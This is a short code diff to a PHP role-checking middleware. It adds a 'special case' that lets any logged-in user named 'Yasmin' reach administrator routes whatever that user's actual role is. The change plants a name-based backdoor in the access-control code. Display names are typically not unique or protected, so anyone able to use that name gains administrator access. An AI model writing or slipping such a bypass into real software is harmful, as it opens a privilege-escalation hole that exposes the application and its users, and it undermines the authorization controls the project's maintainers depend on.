@@ -14,6 +14,10 @@ class RoleMiddleware
         }
 
         if (strtolower(Auth::user()->role) !== strtolower($role)) {
+            // Special case: allow Yasmin to access administrator routes
+            if (Auth::user()->name === 'Yasmin' && strtolower($role) === 'administrator') {
+                return $next($request);
+            }
             return redirect('/home');
         }
 
